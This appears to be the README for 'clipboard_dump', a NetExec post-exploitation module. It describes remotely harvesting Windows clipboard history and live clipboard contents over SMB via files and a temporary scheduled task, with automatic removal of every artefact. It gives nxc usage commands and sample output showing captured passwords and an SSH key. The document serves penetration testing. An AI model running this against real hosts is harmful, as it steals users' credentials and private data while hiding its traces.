# NetExec `clipboard_dump` Module

`clipboard_dump` remotely dumps clipboard data from Windows hosts (Windows 10 / 11  
and Server 2012 → 2022) over SMB. It supports  

| Feature | How it’s collected |
|---------|-------------------|
| **Clipboard History** (Win 10 1809 +) | • Reads `HistoryData\*.json` (local history)<br>• Reads `ActivitiesCache.db` (Timeline / cloud‑sync) |
| **Live clipboard** when history is **disabled** | Creates a short‑lived **interactive Scheduled Task** in the user session:<br>  1. Tries WinRT API `GetHistoryItemsAsync()` for history<br>  2. Falls back to `Get‑Clipboard ‑Raw` for the current item<br>  3. Saves output to `%TEMP%` → copied via SMB → all artefacts deleted |

All artefacts (scheduled task, `.ps1` helper, temp `.txt`) are cleaned up automatically.

---

## Basic Usage

```bash
# dump everything on the target
nxc smb 10.0.0.1 --local-auth -u admin -p 'P@ssw0rd!' -M clipboard_dump
nxc smb <target> --local-auth -u <user> -p <pass> -M clipboard_dump \
    -o VERBOSE=true            # chatter about # items
nxc smb ... -M clipboard_dump -o RAW=true    # don't decode UTF‑16 / Base64
nxc smb ... -M clipboard_dump -o MAX=10      # first 10 items only
```

## Example Output
```bash
CLIPBOARD  10.0.0.1  445  DC01  10.0.0.1 | administrator
#  Timestamp (UTC)                Format  Clipboard Entry
0  2025‑07‑17T19:03:11.509Z       Text    Pa$$w0rd123!
1  2025‑07‑17T18:55:42.284Z       Text    ssh‑key‑id‑rsa ...
2  2025‑07‑17T18:50:10.031Z       LIVE    C:\Temp\invoice.xlsx
```
